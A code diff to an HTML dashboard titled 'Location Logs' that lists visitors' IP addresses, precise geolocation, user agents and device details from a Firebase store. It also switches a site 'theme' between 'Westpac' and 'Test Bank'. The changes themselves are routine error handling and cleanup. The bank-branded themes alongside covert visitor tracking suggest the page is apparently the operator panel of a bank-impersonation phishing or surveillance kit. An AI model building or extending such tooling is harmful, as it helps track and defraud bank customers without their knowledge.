@@ -140,6 +140,15 @@
             width: 16px;
             height: 16px;
         }
+        .error-message {
+            color: #dc3545;
+            background: #f8d7da;
+            border: 1px solid #f5c6cb;
+            padding: 10px;
+            border-radius: 4px;
+            margin: 10px 0;
+            display: none;
+        }
     </style>
 </head>
 <body>
@@ -155,47 +164,50 @@
     
     <div id="mainContent">
         <div class="container">
-        <div class="header">
-            <h1>Location Logs</h1>
-            <div style="display: flex; align-items: center; gap: 20px;">
-                <div>
-                    <button class="refresh-btn" onclick="refreshData()">Refresh Data</button>
-                    <div class="auto-refresh">
-                        <input type="checkbox" id="autoRefresh" onchange="toggleAutoRefresh()">
-                        <label for="autoRefresh">Auto-refresh (30s)</label>
+            <div class="header">
+                <h1>Location Logs</h1>
+                <div style="display: flex; align-items: center; gap: 20px;">
+                    <div>
+                        <button class="refresh-btn" onclick="refreshData()">Refresh Data</button>
+                        <div class="auto-refresh">
+                            <input type="checkbox" id="autoRefresh" onchange="toggleAutoRefresh()">
+                            <label for="autoRefresh">Auto-refresh (30s)</label>
+                        </div>
+                    </div>
+                    <div>
+                        <label for="themeSelect">Active Theme: </label>
+                        <select id="themeSelect" onchange="updateTheme(this.value)">
+                            <option value="westpac">Westpac</option>
+                            <option value="test">Test Bank</option>
+                        </select>
                     </div>
                 </div>
-                <div>
-                    <label for="themeSelect">Active Theme: </label>
-                    <select id="themeSelect" onchange="updateTheme(this.value)">
-                        <option value="westpac">Westpac</option>
-                        <option value="test">Test Bank</option>
-                    </select>
-                </div>
             </div>
-        </div>
-        
-        <div class="map">
-            <div id="locationMap"></div>
-        </div>
+            
+            <div id="errorMessage" class="error-message"></div>
+            
+            <div class="map">
+                <div id="locationMap"></div>
+            </div>
 
-        <table class="logs">
-            <thead>
-                <tr>
-                    <th>Timestamp</th>
-                    <th>IP Address</th>
-                    <th>Location</th>
-                    <th>Accuracy</th>
-                    <th>Source</th>
-                    <th>User Agent</th>
-                    <th>Device Info</th>
-                    <th>Actions</th>
-                </tr>
-            </thead>
-            <tbody id="logsTable">
-                <!-- Data will be populated by JavaScript -->
-            </tbody>
-        </table>
+            <table class="logs">
+                <thead>
+                    <tr>
+                        <th>Timestamp</th>
+                        <th>IP Address</th>
+                        <th>Location</th>
+                        <th>Accuracy</th>
+                        <th>Source</th>
+                        <th>User Agent</th>
+                        <th>Device Info</th>
+                        <th>Actions</th>
+                    </tr>
+                </thead>
+                <tbody id="logsTable">
+                    <!-- Data will be populated by JavaScript -->
+                </tbody>
+            </table>
+        </div>
     </div>
 
     <!-- Firebase SDK -->
@@ -229,10 +241,18 @@
         let markers = [];
         let autoRefreshInterval;
 
+        function showError(message) {
+            const errorElement = document.getElementById('errorMessage');
+            errorElement.textContent = message;
+            errorElement.style.display = 'block';
+            setTimeout(() => {
+                errorElement.style.display = 'none';
+            }, 5000);
+        }
+
         function toggleAutoRefresh() {
             const autoRefreshCheckbox = document.getElementById('autoRefresh');
             if (autoRefreshCheckbox.checked) {
-                // Refresh every 30 seconds
                 autoRefreshInterval = setInterval(refreshData, 30000);
             } else {
                 clearInterval(autoRefreshInterval);
@@ -240,13 +260,16 @@
         }
 
         function initMap() {
-            // Initialize Leaflet map
-            map = L.map('locationMap').setView([0, 0], 2);
-            
-            // Add OpenStreetMap tile layer
-            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-                attribution: '© OpenStreetMap contributors'
-            }).addTo(map);
+            try {
+                map = L.map('locationMap').setView([0, 0], 2);
+                
+                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                    attribution: '© OpenStreetMap contributors'
+                }).addTo(map);
+            } catch (error) {
+                console.error('Error initializing map:', error);
+                showError('Error initializing map. Please refresh the page.');
+            }
         }
 
         function refreshData() {
@@ -260,23 +283,20 @@
                     const logsTable = document.getElementById('logsTable');
                     logsTable.innerHTML = '';
                     
-                    // Get the latest location for initial map view
                     let latestLocation = null;
+                    
                     snapshot.forEach(childSnapshot => {
                         const data = childSnapshot.val();
                         const locationKey = childSnapshot.key;
                         
-                        // Keep track of latest location based on timestamp
                         if (!latestLocation || new Date(data.timestamp) > new Date(latestLocation.timestamp)) {
                             latestLocation = data;
                         }
                         
-                        // Add table row
                         const row = logsTable.insertRow();
                         row.insertCell(0).textContent = new Date(data.timestamp).toLocaleString();
                         row.insertCell(1).textContent = data.ip;
                         
-                        // Location with tooltip
                         const locationCell = row.insertCell(2);
                         const locationSpan = document.createElement('span');
                         locationSpan.className = 'truncate';
@@ -287,7 +307,6 @@
                         row.insertCell(3).textContent = data.accuracy ? `±${Math.round(data.accuracy)}m` : 'Unknown';
                         row.insertCell(4).textContent = data.locationSource || 'Unknown';
                         
-                        // User Agent with tooltip
                         const uaCell = row.insertCell(5);
                         const uaSpan = document.createElement('span');
                         uaSpan.className = 'truncate';
@@ -295,7 +314,6 @@
                         uaSpan.setAttribute('title', data.userAgent);
                         uaCell.appendChild(uaSpan);
 
-                        // Device Info with tooltip
                         const deviceCell = row.insertCell(6);
                         const deviceSpan = document.createElement('span');
                         deviceSpan.className = 'truncate';
@@ -314,18 +332,16 @@
                         deviceSpan.setAttribute('title', deviceInfo);
                         deviceCell.appendChild(deviceSpan);
 
-                        // Add delete button
-                        const actionsCell = row.insertCell(6);
+                        const actionsCell = row.insertCell(7);
                         const deleteBtn = document.createElement('button');
                         deleteBtn.textContent = 'Delete';
                         deleteBtn.className = 'delete-btn';
                         deleteBtn.onclick = (e) => {
-                            e.stopPropagation(); // Prevent row selection when clicking delete
+                            e.stopPropagation();
                             if (confirm('Are you sure you want to delete this location record?')) {
                                 database.ref('locations/' + locationKey).remove()
                                     .then(() => {
                                         row.remove();
-                                        // Remove marker from map
                                         const markerIndex = markers.findIndex(m => 
                                             m.getLatLng().lat === data.latitude && 
                                             m.getLatLng().lng === data.longitude
@@ -337,65 +353,74 @@
                                     })
                                     .catch(error => {
                                         console.error('Error deleting record:', error);
-                                        alert('Error deleting record. Please try again.');
+                                        showError('Error deleting record. Please try again.');
                                     });
                             }
                         };
                         actionsCell.appendChild(deleteBtn);
 
-                        // Add marker to map
-                        const marker = L.marker([data.latitude, data.longitude])
-                            .bindPopup(`${data.ip}<br>${new Date(data.timestamp).toLocaleString()}`)
-                            .addTo(map);
-                        markers.push(marker);
+                        try {
+                            const marker = L.marker([data.latitude, data.longitude])
+                                .bindPopup(`${data.ip}<br>${new Date(data.timestamp).toLocaleString()}`)
+                                .addTo(map);
+                            markers.push(marker);
 
-                        // Add click handler to row
-                        row.addEventListener('click', () => {
-                            // Remove selected class from all rows
-                            document.querySelectorAll('.logs tr').forEach(r => r.classList.remove('selected'));
-                            // Add selected class to clicked row
-                            row.classList.add('selected');
-                            // Center and zoom map on marker with padding
-                            map.fitBounds([[data.latitude, data.longitude]], {
+                            row.addEventListener('click', () => {
+                                document.querySelectorAll('.logs tr').forEach(r => r.classList.remove('selected'));
+                                row.classList.add('selected');
+                                map.fitBounds([[data.latitude, data.longitude]], {
+                                    maxZoom: 16,
+                                    padding: [50, 50]
+                                });
+                                marker.openPopup();
+                            });
+                        } catch (error) {
+                            console.error('Error adding marker:', error);
+                            showError('Error displaying location on map.');
+                        }
+                    });
+
+                    if (latestLocation) {
+                        try {
+                            map.fitBounds([[latestLocation.latitude, latestLocation.longitude]], {
                                 maxZoom: 16,
                                 padding: [50, 50]
                             });
-                            // Open popup
-                            marker.openPopup();
-                        });
-                    });
-
-                    // Set map view to latest location with proper zoom
-                    if (latestLocation) {
-                        map.fitBounds([[latestLocation.latitude, latestLocation.longitude]], {
-                            maxZoom: 16,
-                            padding: [50, 50]
-                        });
+                        } catch (error) {
+                            console.error('Error setting map view:', error);
+                            showError('Error centering map on latest location.');
+                        }
                     }
                 })
                 .catch(error => {
                     console.error('Error fetching data:', error);
-                    alert('Error fetching data. Please try again.');
+                    showError('Error fetching data. Please try again.');
                 });
         }
-
-        // Initialize map and load data will happen after successful login
     </script>
     <script src="themes/config.js"></script>
     <script>
         function updateTheme(themeName) {
             if (confirm('Are you sure you want to change the active theme?')) {
                 database.ref('activeTheme').set(themeName)
-                    .then(() => alert('Theme updated successfully'))
-                    .catch(error => alert('Error updating theme: ' + error.message));
+                    .then(() => {
+                        showError('Theme updated successfully');
+                    })
+                    .catch(error => {
+                        console.error('Error updating theme:', error);
+                        showError('Error updating theme: ' + error.message);
+                    });
             }
         }
 
-        // Load current theme on startup
         database.ref('activeTheme').once('value')
             .then(snapshot => {
                 const activeTheme = snapshot.val() || 'westpac';
                 document.getElementById('themeSelect').value = activeTheme;
+            })
+            .catch(error => {
+                console.error('Error loading theme:', error);
+                showError('Error loading current theme.');
             });
     </script>
 </body>
